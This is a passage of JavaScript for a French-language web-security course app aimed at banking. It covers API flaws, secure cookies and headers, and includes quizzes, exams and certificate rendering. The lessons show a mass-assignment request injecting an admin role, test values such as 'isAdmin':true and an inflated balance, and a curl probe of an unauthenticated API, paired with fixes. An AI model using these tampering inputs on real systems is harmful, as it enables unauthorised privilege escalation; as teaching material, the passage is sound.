+cours:"<h3>API REST</h3><table><tr><th>Verbe</th><th>Action</th></tr><tr><td>GET</td><td>Lire</td></tr><tr><td>POST</td><td>Créer</td></tr><tr><td>PUT</td><td>Remplacer</td></tr><tr><td>PATCH</td><td>Modifier</td></tr><tr><td>DELETE</td><td>Supprimer</td></tr></table><h3>Failles spécifiques</h3><h4>1. Pas d authentification</h4><p>GET /api/users sans token → toute la base.</p><h4>2. BOLA (Broken Object Level Auth)</h4><p>User authentifié accède aux données d autres. #1 failles API.</p><h4>3. Mass Assignment</h4><p>Endpoint attend {name, email} mais accepte {role:admin}.</p><pre>POST /api/users\n{\"name\":\"Jean\",\"role\":\"admin\"}</pre><h4>4. Pas de rate limiting</h4><h4>5. Exposition excessive</h4><p>GET /api/users/123 retourne mdp hashé, tokens.</p><h4>6. CORS mal configuré</h4><p>Access-Control-Allow-Origin: * → tout site appelle l API.</p><h3>Correction</h3><ul><li>Auth obligatoire</li><li>BOLA vérifiée serveur</li><li>Whitelist champs</li><li>Rate limiting IP + user</li><li>DTO (pas données sensibles)</li><li>CORS restrictif</li></ul><div class=\"box\">Service au comptoir : sans badge (token), rien ne sort.</div><div class=\"bank\">BOLA + mass assignment = les plus recherchées en API bancaire.</div>",
+cas:"<h3>Cas 1 — Tester auth</h3><pre>curl https://api.banque.ci/users</pre><p>Sans token : 401 attendu. Si 200 → faille critique.</p><h3>Cas 2 — Mass assignment</h3><p>Burp : ajouter \"role\":\"admin\" dans body JSON. Si rôle change en base → faille.</p><p>Tester aussi \"isAdmin\":true, \"balance\":999999.</p><h3>Cas 3 — Corriger</h3><pre>// VULNÉRABLE\napp.post('/api/users', async (req, res) =&gt; {\n  const u = await User.create(req.body);\n  res.json(u);\n});</pre><pre>// SÉCURISÉ\napp.post('/api/users', authenticate, async (req, res) =&gt; {\n  const { name, email } = req.body;\n  const u = await User.create({ name, email, role: 'user' });\n  res.json({ id: u.id, name: u.name, email: u.email });\n});</pre>",
+quiz:[
+{q:'BOLA ?',o:['Faille autorisation API','Crypto','Protocole','Virus'],c:0,e:'Broken Object Level Auth.'},
+{q:'Mass assignment ?',o:['Beaucoup requêtes','Champs non prévus','DNS','Cookie'],c:1,e:'Injecter champs.'}
+]},
+
+{id:9, titre:"Cookies et headers de sécurité", intro:"Première ligne de défense. Bien configurés, ils bloquent 80% des attaques front.",
+cours:"<h3>Cookies sécurisés</h3><table><tr><th>Attribut</th><th>Effet</th></tr><tr><td>Secure</td><td>HTTPS uniquement</td></tr><tr><td>HttpOnly</td><td>Inaccessible JS (anti-XSS)</td></tr><tr><td>SameSite=Strict</td><td>Pas depuis autre domaine (anti-CSRF)</td></tr><tr><td>Max-Age</td><td>Durée de vie</td></tr></table><h4>Cookie parfait</h4><pre>Set-Cookie: sessionid=abc; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=1800</pre><h3>Headers de sécurité</h3><h4>1. Content-Security-Policy</h4><pre>Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.banque.ci</pre><h4>2. Strict-Transport-Security</h4><pre>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</pre><h4>3. X-Frame-Options</h4><pre>X-Frame-Options: DENY</pre><h4>4. X-Content-Type-Options</h4><pre>X-Content-Type-Options: nosniff</pre><h4>5. Referrer-Policy</h4><pre>Referrer-Policy: strict-origin-when-cross-origin</pre><h4>6. Permissions-Policy</h4><pre>Permissions-Policy: camera=(), microphone=(), geolocation=()</pre><div class=\"box\">Règles de sécurité d un immeuble. CSP = liste autorisés. HSTS = entrée principale obligatoire.</div><div class=\"bank\">Banques doivent avoir CSP + HSTS + X-Frame-Options + cookies Secure/HttpOnly/SameSite.</div><div class=\"warn\">CSP avec * = aucune protection.</div>",
+cas:"<h3>Cas 1 — Auditer</h3><pre>curl -I https://banque.ci</pre><p>Ou securityheaders.com. Score A+ exigé banques.</p><h3>Cas 2 — Cookie faible</h3><pre>Set-Cookie: sessionid=abc123</pre><p>❌ Pas Secure, pas HttpOnly, pas SameSite. Correction :</p><pre>Set-Cookie: sessionid=abc; Secure; HttpOnly; SameSite=Strict; Max-Age=1800</pre><h3>Cas 3 — CSP Nginx</h3><pre>add_header Content-Security-Policy \"default-src 'self'; script-src 'self' https://cdn.banque.ci; frame-ancestors 'none'\" always;\nadd_header Strict-Transport-Security \"max-age=31536000\" always;\nadd_header X-Frame-Options \"DENY\" always;\nadd_header X-Content-Type-Options \"nosniff\" always;</pre>",
+quiz:[
+{q:'HttpOnly ?',o:['Empêche envoi','Empêche JS','Chiffre','Signe'],c:1,e:'Anti-XSS.'},
+{q:'HSTS ?',o:['HTTP','HTTPS','Cookies','Cache'],c:1,e:'Force HTTPS.'}
+]},
+
+{id:10, titre:"Sécuriser une app complète", intro:"Synthèse : auditer, sécuriser et maintenir une application bancaire.",
+cours:"<h3>Défense en profondeur</h3><ol><li><strong>Réseau</strong> — pare-feu, WAF, DDoS</li><li><strong>Transport</strong> — TLS 1.2+, HSTS</li><li><strong>Serveur</strong> — patch, hardening</li><li><strong>App</strong> — validation, auth, autorisation</li><li><strong>BDD</strong> — moindre privilège, chiffrement</li><li><strong>Client</strong> — CSP, cookies sécurisés</li><li><strong>Monitoring</strong> — logs, alertes, SIEM</li></ol><h3>Checklist</h3><h4>Auth</h4><ul><li>MFA obligatoire</li><li>Mdp 12+, Argon2id</li><li>Rate limit 5/15min</li><li>Message générique</li><li>Cookie Secure+HttpOnly+SameSite</li><li>Expiration 30min</li><li>Logout serveur</li></ul><h4>Autorisation</h4><ul><li>Vérif propriété sur CHAQUE endpoint</li><li>Check admin serveur</li><li>UUID > IDs séquentiels</li></ul><h4>Injections</h4><ul><li>Requêtes préparées partout</li><li>Validation whitelist</li><li>Pas d erreurs SQL en prod</li></ul><h4>XSS</h4><ul><li>Échappement HTML</li><li>CSP stricte</li><li>HttpOnly cookies</li></ul><h4>CSRF</h4><ul><li>Token sur POST</li><li>SameSite=Strict</li><li>Vérif Origin</li></ul><h4>API</h4><ul><li>Auth obligatoire</li><li>BOLA vérifiée</li><li>Whitelist champs</li><li>Rate limiting</li></ul><h4>Monitoring</h4><ul><li>Logs toutes requêtes</li><li>Alertes SIEM</li><li>Rétention 6-12 mois (BCEAO, PCI-DSS)</li></ul><div class=\"box\">Sécuriser une app = sécuriser une banque physique.</div><div class=\"bank\">App bancaire conforme = toutes ces cases cochées.</div><div class=\"warn\">WAF ne remplace PAS le code sécurisé.</div>",
+cas:"<h3>Cas 1 — Audit 7 étapes</h3><ol><li>Reconnaissance</li><li>Auth (brute force, MFA, reset)</li><li>Autorisation (IDOR, admin)</li><li>Injections</li><li>Session</li><li>API</li><li>Headers &amp; TLS</li></ol><h3>Cas 2 — Rapport pentest</h3><ol><li>Résumé exécutif</li><li>Méthodologie</li><li>Vulns par sévérité</li><li>Preuves</li><li>Recommandations</li><li>Annexes</li></ol><h3>Cas 3 — WAF Cloudflare</h3><ol><li>Compte Cloudflare</li><li>DNS → Cloudflare</li><li>« I m Under Attack »</li><li>Règles OWASP managées</li><li>Rate limiting</li><li>SSL Strict + HSTS</li></ol>",
+quiz:[
+{q:'Défense en profondeur ?',o:['Une protection','Plusieurs couches','Un mdp','Antivirus'],c:1,e:'Empiler.'},
+{q:'Rétention logs BCEAO ?',o:['1 jour','1 semaine','6-12 mois','10 ans'],c:2,e:'BCEAI/PCI-DSS.'}
+]}
+];
+
+var CERTS = [
+{id:'tryhackme', nom:'Pre-Security Path', org:'TryHackMe', free:true, niv:'Débutant', lien:'https://tryhackme.com/path/outline/presecurity', desc:'Bases cybersécurité.'},
+{id:'tryhackme-web', nom:'Web Fundamentals', org:'TryHackMe', free:true, niv:'Débutant+', lien:'https://tryhackme.com/module/web-fundamentals', desc:'Bases du web.'},
+{id:'owasp', nom:'OWASP Top 10', org:'OWASP', free:true, niv:'Intermédiaire', lien:'https://owasp.org/www-project-top-ten/', desc:'Doc officielle.'},
+{id:'portswigger', nom:'Web Security Academy', org:'PortSwigger', free:true, niv:'Intermédiaire', lien:'https://portswigger.net/web-security', desc:'LA référence gratuite.'},
+{id:'comptia-sec', nom:'CompTIA Security+', org:'CompTIA', free:false, prix:'~380 USD', niv:'Intermédiaire', lien:'https://www.comptia.org/certifications/security', desc:'Entrée cyber.'},
+{id:'comptia-pentest', nom:'CompTIA PenTest+', org:'CompTIA', free:false, prix:'~404 USD', niv:'Avancé', lien:'https://www.comptia.org/certifications/pentest', desc:'Pentest.'},
+{id:'ejpt', nom:'eJPT', org:'INE Security', free:false, prix:'~200 USD', niv:'Intermédiaire', lien:'https://security.ine.com/certifications/ejpt-certification/', desc:'Junior pentester.'},
+{id:'ceh', nom:'CEH', org:'EC-Council', free:false, prix:'~1199 USD', niv:'Intermédiaire+', lien:'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/', desc:'Hacking éthique.'},
+{id:'oscp', nom:'OSCP', org:'OffSec', free:false, prix:'~1599 USD', niv:'Avancé', lien:'https://www.offsec.com/courses/pen-200/', desc:'LA certif pentest.'},
+{id:'cissp', nom:'CISSP', org:'ISC2', free:false, prix:'~749 USD', niv:'Expert', lien:'https://www.isc2.org/certifications/cissp', desc:'RSSI.'}
+];
+
+var JOBS = [
+{t:'Ingénieur Cybersécurité Senior', o:'Groupe COFINA', l:'Abidjan', d:'SIEM, IAM, pentest web.', u:'https://www.groupecofina.com/carriere/'},
+{t:'Ingénieur Sécurité Informatique', o:'BDU CI', l:'Abidjan', d:'Sécurité web.', u:'https://bduci.com/'},
+{t:'Chargé Sécurité SI', o:'DC/BR UMOA', l:'Abidjan', d:'Sécurité SI.', u:'https://www.dcbruemoa.org/'},
+{t:'Stagiaire Cybersécurité', o:'AFG Holding', l:'Abidjan', d:'Vulnérabilités web.', u:'https://afgholding-sa.com/'},
+{t:'Pentester Junior', o:'Djamo', l:'Abidjan', d:'Tests web.', u:'https://djamo.com/'},
+{t:'Ingénieur Cyber Junior', o:'Eclozion', l:'Abidjan', d:'Junior.', u:'https://ci.eclozion-opportunities.com/'}
+];
+
+var EXAMENS = {
+partiel: {
+  titre:'Partiel — Défis 1-5',
+  desc:'Intro web, OWASP, SQLi, XSS, CSRF. Réussite : 60 %.',
+  req:[1,2,3,4,5],
+  qs:[
+    {q:'HTTPS protège contre ?', o:['SQLi','XSS','MITM','IDOR'], c:2, e:'Transport.'},
+    {q:'OWASP #1 2021 ?', o:['Injection','Broken Access Control','XSS','CSRF'], c:1, e:'A01.'},
+    {q:'SQLi causée par ?', o:['Mdp faible','Concaténation','Certificat','DNS'], c:1, e:'Concaténation.'},
+    {q:'XSS stocké ?', o:['Temporaire','Persistant','Chiffré','Signé'], c:1, e:'Persiste.'},
+    {q:'Protection CSRF ?', o:['WAF','Token','HTTPS','Antivirus'], c:1, e:'Token unique.'}
+  ]
+},
+final: {
+  titre:'Final — Défis 1-10',
+  desc:'Complet. Réussite : 80 %.',
+  req:[1,2,3,4,5,6,7,8,9,10],
+  qs:[
+    {q:'Requêtes préparées ?', o:['XSS','SQLi','CSRF','MITM'], c:1, e:'Séparent données.'},
+    {q:'HttpOnly ?', o:['Empêche JS','Chiffre','Signe','Envoie'], c:0, e:'document.cookie.'},
+    {q:'BOLA ?', o:['Algorithme','Faille auth API','Protocole','Virus'], c:1, e:'IDOR API.'},
+    {q:'Mass assignment ?', o:['Beaucoup requêtes','Champs non prévus','DNS','Cookie'], c:1, e:'Champs injectés.'},
+    {q:'CSP ?', o:['Chiffrer','Sources autorisées','Signer','Loguer'], c:1, e:'Header.'},
+    {q:'HSTS ?', o:['HTTP','HTTPS','Cookies','Cache'], c:1, e:'Force HTTPS.'},
+    {q:'MFA ?', o:['Antivirus','Multi-facteurs','Algorithme','Protocole'], c:1, e:'Second facteur.'},
+    {q:'JWT localStorage ?', o:['Sûr','Vuln XSS','SQLi','MITM'], c:1, e:'XSS lit.'},
+    {q:'WAF remplace code ?', o:['Oui','Non','Parfois','API'], c:1, e:'Complément.'},
+    {q:'IDOR corrigé par ?', o:['Cacher bouton','Vérif serveur','HTTPS','Antivirus'], c:1, e:'Vérif propriété.'}
+  ]
+}
+};
+
+/* ============================================================
+   RENDER
+   ============================================================ */
+function header() {
+  var el = document.getElementById('hs'); if (!el) return;
+  var u = user();
+  if (u) {
+    el.innerHTML = '<span class="pill">👤 ' + u.name + '</span>' +
+      '<span class="pill">N1 <b>' + countDone(1) + '</b></span>' +
+      '<span class="pill">N2 <b>' + countDone(2) + '</b></span>' +
+      '<span class="pill">N3 <b>' + countDone(3) + '</b></span>' +
+      '<span class="pill">N4 <b>' + countDone(4) + '</b></span>' +
+      '<span class="pill">N5 <b>' + countDone(5) + '</b></span>' +
+      '<a onclick="logout()">Déconnexion</a>';
+  } else { el.innerHTML = '<span class="pill">Non connecté</span>'; }
+}
+
+function renderLogin() {
+  document.getElementById('app').innerHTML = '<div class="login-box"><div style="text-align:center;margin-bottom:18px"><div style="display:inline-block;width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,#f97316,#ea580c);display:flex;align-items:center;justify-content:center;font-size:1.7rem">🌐</div></div><h2>Niveau 5</h2><p style="text-align:center;color:#94a3b8;font-size:.85rem;margin-bottom:22px">Connecte-toi pour accéder au niveau Sécurité Web.</p><input id="loginName" placeholder="Ton prénom" autocomplete="off"><button onclick="login()">Se connecter</button></div>';
+  setTimeout(function(){ var e = document.getElementById('loginName'); if (e) e.focus(); }, 100);
+}
+
+function renderLocked() {
+  var d4 = countDone(4);
+  document.getElementById('app').innerHTML = '<div class="card"><div class="locked"><div class="icon">🔒</div><h3>Niveau 5 verrouillé</h3><p>Termine les 10 défis du Niveau 4 pour accéder au Niveau 5.</p><div class="bar"><div style="width:' + (d4*10) + '%"></div></div><p style="color:#fbbf24;font-weight:700;margin-top:10px">' + d4 + ' / 10 défis Niveau 4</p><div class="nav" style="justify-content:center;margin-top:14px"><button onclick="simulate()">🔓 Simuler N1 à N4</button></div></div></div>';
+}
+
+function renderHome() {
+  var u = user(); if (!u) return renderLogin();
+  var d = countDone(5);
+  var pct = Math.round(d / 10 * 100);
+  var html = '<div class="card"><h2>Bienvenue, ' + u.name + ' 🌐</h2><p>Niveau 5 : <strong>Sécurité Web</strong>. OWASP Top 10, SQLi, XSS, CSRF, IDOR, API, headers.</p>';
+  html += '<div class="stats-grid"><div class="stat"><span class="big">' + d + '/10</span><span class="lbl">Défis N5</span></div><div class="stat"><span class="big">' + u.certs.length + '</span><span class="lbl">Certifs</span></div><div class="stat"><span class="big">' + pct + '%</span><span class="lbl">Progression</span></div><div class="stat"><span class="big">' + (u.examens['5_partiel'] ? '✅' : '—') + '</span><span class="lbl">Partiel</span></div></div>';
+  html += '<div class="progress-bar"><div style="width:' + pct + '%"></div></div></div>';
+  html += '<div class="card"><h2>🚀 Accès rapide</h2><div class="nav">';
+  html += '<button onclick="go(\'\')">📚 Défis</button>';
+  html += '<button class="sec" onclick="go(\'stats\')">📊 Stats</button>';
+  html += '<button class="gold" onclick="go(\'certif\')">🎓 Certificat</button>';
+  html += '<button class="sec" onclick="go(\'cv\')">📄 CV</button>';
+  html += '<button class="sec" onclick="go(\'jobs\')">💼 Emploi</button>';
+  html += '<button class="sec" onclick="go(\'examens\')">📝 Examens</button>';
+  html += '<button class="sec" onclick="go(\'certs\')">🎓 Certifications</button>';
+  html += '<button class="sec" onclick="go(\'sync\')">🌐 Sync</button>';
+  html += '</div></div>';
+  html += '<div class="card"><h2>🎯 Les 10 défis</h2><div class="grid">';
+  for (var i = 0; i < DEFIS.length; i++) {
+    var df = DEFIS[i];
+    var done = u.done['5_' + df.id];
+    html += '<div class="btn ' + (done ? 'done' : '') + '" onclick="go(\'defi/' + df.id + '\')"><span class="n">Défi ' + df.id + (done ? ' ✓' : '') + '</span><span class="ti">' + df.titre + '</span></div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderDefi(id) {
+  var d = null;
+  for (var i = 0; i < DEFIS.length; i++) { if (DEFIS[i].id === id) { d = DEFIS[i]; break; } }
+  if (!d) { alert('Défi introuvable'); go('home'); return; }
+  var u = user();
+  var done = u.done['5_' + id];
+  var html = '<div class="crumb"><a onclick="go(\'home\')">Accueil N5</a> / Défi ' + id + '</div>';
+  html += '<div class="card"><h2>' + d.titre + '</h2><div class="intro">' + d.intro + '</div></div>';
+  html += '<div class="card cours"><h2>📖 Cours</h2>' + d.cours + '</div>';
+  html += '<div class="card cours"><h2>🔧 Cas pratiques</h2>' + d.cas + '</div>';
+  html += '<div class="card"><h2>📝 Quiz</h2><div class="quiz">';
+  for (var qi = 0; qi < d.quiz.length; qi++) {
+    var q = d.quiz[qi];
+    html += '<div class="q" data-i="' + qi + '"><p>Q' + (qi + 1) + '. ' + q.q + '</p>';
+    for (var oi = 0; oi < q.o.length; oi++) {
+      html += '<label><input type="radio" name="q' + qi + '" value="' + oi + '"> ' + q.o[oi] + '</label>';
+    }
+    html += '<div class="exp" id="exp' + qi + '">' + q.e + '</div></div>';
+  }
+  html += '<button onclick="validerQuiz(' + id + ')">Vérifier</button><div id="qr"></div></div></div>';
+  html += '<div class="nav">';
+  if (id > 1) html += '<button class="sec" onclick="go(\'defi/' + (id - 1) + '\')">← Précédent</button>';
+  if (id < 10) html += '<button class="sec" onclick="go(\'defi/' + (id + 1) + '\')">Suivant →</button>';
+  html += '<button onclick="go(\'home\')">🏠 Accueil</button>';
+  if (done) html += '<button class="green">✓ Validé</button>';
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+  window.scrollTo(0, 0);
+}
+
+function validerQuiz(id) {
+  var d = null;
+  for (var i = 0; i < DEFIS.length; i++) { if (DEFIS[i].id === id) { d = DEFIS[i]; break; } }
+  if (!d) return;
+  var correct = 0;
+  for (var qi = 0; qi < d.quiz.length; qi++) {
+    var q = d.quiz[qi];
+    var sel = document.querySelector('input[name="q' + qi + '"]:checked');
+    var labels = document.querySelectorAll('.q[data-i="' + qi + '"] label');
+    for (var li = 0; li < labels.length; li++) { labels[li].classList.remove('ok','ko'); }
+    var e = document.getElementById('exp' + qi); if (e) e.style.display = 'block';
+    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }
+    else { labels[q.c].classList.add('ok'); if (sel) labels[parseInt(sel.value)].classList.add('ko'); }
+  }
+  var u = user();
+  if (correct === d.quiz.length) {
+    var k = '5_' + id;
+    if (!u.done[k]) {
+      u.done[k] = true;
+      var t = today();
+      if (!u.jours[t]) u.jours[t] = [];
+      if (u.jours[t].indexOf(k) === -1) u.jours[t].push(k);
+    }
+  }
+  save();
+  var r = document.getElementById('qr');
+  var pass = correct === d.quiz.length;
+  r.className = 'res ' + (pass ? 'g' : 'r');
+  r.textContent = pass ? '🎉 ' + correct + '/' + d.quiz.length + ' — Défi validé !' : correct + '/' + d.quiz.length + ' — Réessaie';
+  if (pass && id === 10 && isComplete(5)) {
+    setTimeout(function(){ alert('🏆 Tu as terminé le Niveau 5 !'); }, 400);
+  }
+}
+
+function renderCertif() {
+  var u = user(); if (!u) return;
+  var d = countDone(5);
+  var unlocked = d >= 10;
+  var certId = 'MDPC-N5-' + u.name.slice(0,3).toUpperCase() + '-' + d;
+  var html = '<div class="card">';
+  if (!unlocked) {
+    html += '<div class="locked"><div class="icon">🔒</div><h3>Certificat N5 verrouillé</h3><p>Valide les 10 défis.</p><div class="bar"><div style="width:' + (d*10) + '%"></div></div><p style="color:#fbbf24;font-weight:700;margin-top:10px">' + d + ' / 10</p><div class="nav" style="justify-content:center;margin-top:14px"><button onclick="go(\'\')">📚 Continuer</button></div></div>';
+  } else {
+    html += '<div class="cert"><div class="seal">🏆</div><div class="sub">Certificat officiel</div><div class="title">Niveau 5 — Sécurité Web</div><p style="color:#94a3b8;margin:12px 0;font-size:.9rem">Décerné à</p><div class="name">' + u.name + '</div><p style="color:#94a3b8;max-width:500px;margin:12px auto;font-size:.88rem">Pour avoir validé les 10 défis du Niveau 5 : OWASP Top 10, SQLi, XSS, CSRF, IDOR, sécurité API, headers HTTP.</p><div class="details"><div>Défis<strong>10/10</strong></div><div>Partiel<strong>' + (u.examens['5_partiel'] ? '✅' : '—') + '</strong></div><div>Final<strong>' + (u.examens['5_final'] ? '✅' : '—') + '</strong></div><div>Date<strong>' + new Date().toLocaleDateString('fr-FR') + '</strong></div></div><div class="id">ID : ' + certId + '</div><div class="sig"><div class="sig-block"><div class="sig-name">H. N\'GUESSAN</div><div class="sig-line">Fondateur</div></div><div class="sig-block"><div class="sig-name" style="font-family:Georgia,serif">' + new Date().toLocaleDateString('fr-FR') + '</div><div class="sig-line">Date</div></div></div></div>';
+    html += '<div class="nav" style="justify-content:center;margin-top:14px"><button onclick="window.print()">🖨️ PDF</button><button class="gold" onclick="go(\'cv\')">📄 CV</button></div>';
+  }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderCV() {
+  var u = user(); if (!u) return;
+  var badges = '';
+  for (var i = 0; i < u.certs.length; i++) {
+    for (var j = 0; j < CERTS.length; j++) {
+      if (CERTS[j].id === u.certs[i]) { badges += '<span class="badge">' + CERTS[j].nom + '</span>'; break; }
+    }
+  }
+  if (!badges) badges = '<span style="color:#94a3b8;font-size:.85rem;font-style:italic">Aucune certification.</span>';
+  var defis = '';
+  for (var i = 0; i < DEFIS.length; i++) {
+    defis += '<li>' + (u.done['5_' + DEFIS[i].id] ? '✓' : '○') + ' ' + DEFIS[i].titre + '</li>';
+  }
+  var html = '<div class="card" style="background:none;border:none;padding:0">';
+  html += '<div class="nav" style="margin-bottom:14px"><button onclick="window.print()">🖨️ PDF</button><button class="sec" onclick="copyCV()">📋 Copier</button></div>';
+  html += '<div class="cv-box"><h1>' + u.name.toUpperCase() + '</h1><div class="role">Étudiant L2 UVCI — Aspirant Analyste Sécurité Web</div>';
+  html += '<h2>Formation</h2><ul><li>Licence 2 — UVCI (Sciences informatiques)</li><li>Mon Drôle Parcours Cyber N1 → N5 (N5 : ' + countDone(5) + '/10)</li></ul>';
+  html += '<h2>Compétences</h2><ul><li>OWASP Top 10, SQLi, XSS, CSRF, IDOR</li><li>Sécurité API (BOLA, mass assignment, CORS)</li><li>Headers HTTP, CSP, HSTS, cookies sécurisés</li></ul>';
+  html += '<h2>Défis N5 validés</h2><ul>' + defis + '</ul>';
+  html += '<h2>Certifications</h2><div>' + badges + '</div>';
+  html += '<p style="margin-top:20px;font-size:.72rem;color:#94a3b8;text-align:center;border-top:1px solid #e2e8f0;padding-top:12px">Généré le ' + new Date().toLocaleDateString('fr-FR') + ' · H. N\'GUESSAN ®</p></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function copyCV() {
+  var u = user(); if (!u) return;
+  var t = u.name.toUpperCase() + '\nÉtudiant L2 UVCI — Aspirant Analyste Sécurité Web\n\nParcours Cyber N1 à N5\n\nCompétences : OWASP, SQLi, XSS, CSRF, IDOR, API security, headers HTTP\n\nGénéré le ' + new Date().toLocaleDateString('fr-FR');
+  if (navigator.clipboard) { navigator.clipboard.writeText(t).then(function(){ alert('CV copié !'); }, function(){ fbCopy(t); }); } else fbCopy(t);
+}
+function fbCopy(t) { var ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); try { document.execCommand('copy'); alert('CV copié !'); } catch (e) { alert('Copie manuelle'); } document.body.removeChild(ta); }
+
+function renderStats() {
+  var u = user(); if (!u) return;
+  var t = today();
+  var tt = u.jours[t] || [];
+  var html = '<div class="card"><h2>📊 Statistiques</h2><div class="stats-grid">';
+  html += '<div class="stat"><span class="big">' + countDone(1) + '</span><span class="lbl">N1</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(2) + '</span><span class="lbl">N2</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(3) + '</span><span class="lbl">N3</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(4) + '</span><span class="lbl">N4</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(5) + '</span><span class="lbl">N5</span></div>';
+  html += '</div></div>';
+  html += '<div class="card"><h3>🔥 Aujourd hui</h3>';
+  if (tt.length === 0) html += '<p style="color:#94a3b8">Aucun défi.</p>';
+  else { html += '<ul class="today">'; for (var i = 0; i < tt.length; i++) { html += '<li>✅ ' + tt[i] + '</li>'; } html += '</ul>'; }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderJobs() {
+  var html = '<div class="card"><h2>💼 Offres CI</h2><div class="jobs-grid">';
+  for (var i = 0; i < JOBS.length; i++) {
+    var j = JOBS[i];
+    html += '<div class="job"><h4>' + j.t + '</h4><div class="org">' + j.o + ' · ' + j.l + '</div><p>' + j.d + '</p><a href="' + j.u + '" target="_blank">Voir ↗</a></div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderCerts() {
+  var u = user();
+  var html = '<div class="card"><h2>🎓 Certifications</h2><div class="tabs">';
+  html += '<div class="tab active" onclick="filterCerts(this,\'all\')">Toutes</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'free\')">Gratuites</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'paid\')">Payantes</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'done\')">Obtenues</div>';
+  html += '</div><div class="certs-grid">';
+  for (var i = 0; i < CERTS.length; i++) {
+    var c = CERTS[i];
+    var isD = u.certs.indexOf(c.id) !== -1;
+    html += '<div class="cert-item ' + (c.free ? 'free' : 'paid') + ' ' + (isD ? 'done' : '') + '" data-t="' + (c.free ? 'free' : 'paid') + '" data-d="' + (isD ? '1' : '0') + '">';
+    html += '<h4>' + c.nom + '</h4><div class="org">' + c.org + '</div>';
+    html += '<div><span class="tag ' + (c.free ? 'free' : 'paid') + '">' + (c.free ? 'GRATUIT' : c.prix) + '</span><span class="tag lvl">' + c.niv + '</span></div>';
+    html += '<p>' + c.desc + '</p><a href="' + c.lien + '" target="_blank">Voir ↗</a>';
+    html += ' <button class="sec" style="padding:5px 10px;font-size:.74em" onclick="toggleCert(\'' + c.id + '\')">' + (isD ? '✓' : 'Marquer') + '</button>';
+    html += '</div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+function filterCerts(el, type) {
+  var tabs = document.querySelectorAll('.tab');
+  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('active');
+  el.classList.add('active');
+  var items = document.querySelectorAll('.cert-item');
+  for (var i = 0; i < items.length; i++) {
+    var m = false;
+    if (type === 'all') m = true;
+    else if (type === 'done') m = items[i].dataset.d === '1';
+    else m = items[i].dataset.t === type;
+    items[i].style.display = m ? 'block' : 'none';
+  }
+}
+function toggleCert(id) {
+  var u = user(); if (!u) return;
+  var i = u.certs.indexOf(id);
+  if (i === -1) u.certs.push(id); else u.certs.splice(i, 1);
+  save(); renderCerts();
+}
+
+function renderExamens() {
+  var u = user(); if (!u) return;
+  var html = '<div class="card"><h2>📝 Examens N5</h2>';
+  var types = ['partiel','final'];
+  for (var i = 0; i < types.length; i++) {
+    var type = types[i];
+    var e = EXAMENS[type];
+    var passed = u.examens['5_' + type];
+    var ready = true;
+    for (var j = 0; j < e.req.length; j++) { if (!u.done['5_' + e.req[j]]) { ready = false; break; } }
+    var cls = 'exam ' + (passed ? 'passed' : (ready ? '' : 'locked'));
+    html += '<div class="' + cls + '"><h4>' + e.titre + '</h4><p style="font-size:.85em;color:#cbd5e1">' + e.desc + '</p>';
+    if (passed) html += '<p style="color:#86efac;font-size:.85em">✅ ' + passed + '</p><button class="green" onclick="go(\'examen/' + type + '\')">Refaire</button>';
+    else if (ready) html += '<button class="gold" onclick="go(\'examen/' + type + '\')">Passer</button>';
+    else html += '<p style="color:#fbbf24;font-size:.82em">🔒 Défis ' + e.req.join(', ') + '</p>';
+    html += '</div>';
+  }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderExamen(type) {
+  var u = user(); if (!u) return;
+  var e = EXAMENS[type]; if (!e) { go('examens'); return; }
+  var ready = true;
+  for (var j = 0; j < e.req.length; j++) { if (!u.done['5_' + e.req[j]]) { ready = false; break; } }
+  if (!ready) { alert('Valide les défis requis.'); go('examens'); return; }
+  var html = '<div class="card"><h2>' + e.titre + '</h2><p style="color:#94a3b8;font-size:.85em">' + e.desc + '</p><div class="quiz">';
+  for (var qi = 0; qi < e.qs.length; qi++) {
+    var q = e.qs[qi];
+    html += '<div class="q" data-i="' + qi + '"><p>Q' + (qi + 1) + '. ' + q.q + '</p>';
+    for (var oi = 0; oi < q.o.length; oi++) {
+      html += '<label><input type="radio" name="ex' + qi + '" value="' + oi + '"> ' + q.o[oi] + '</label>';
+    }
+    html += '<div class="exp" id="exexp' + qi + '">' + q.e + '</div></div>';
+  }
+  html += '<button onclick="validerExamen(\'' + type + '\')">Soumettre</button><div id="er"></div></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function validerExamen(type) {
+  var u = user(); if (!u) return;
+  var e = EXAMENS[type]; if (!e) return;
+  var correct = 0;
+  for (var qi = 0; qi < e.qs.length; qi++) {
+    var q = e.qs[qi];
+    var sel = document.querySelector('input[name="ex' + qi + '"]:checked');
+    var labels = document.querySelectorAll('.q[data-i="' + qi + '"] label');
+    for (var li = 0; li < labels.length; li++) { labels[li].classList.remove('ok','ko'); }
+    var ex = document.getElementById('exexp' + qi); if (ex) ex.style.display = 'block';
+    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }
+    else { labels[q.c].classList.add('ok'); if (sel) labels[parseInt(sel.value)].classList.add('ko'); }
+  }
+  var pct = Math.round(correct / e.qs.length * 100);
+  var req = type === 'final' ? 80 : 60;
+  var pass = pct >= req;
+  if (pass) { u.examens['5_' + type] = today(); save(); }
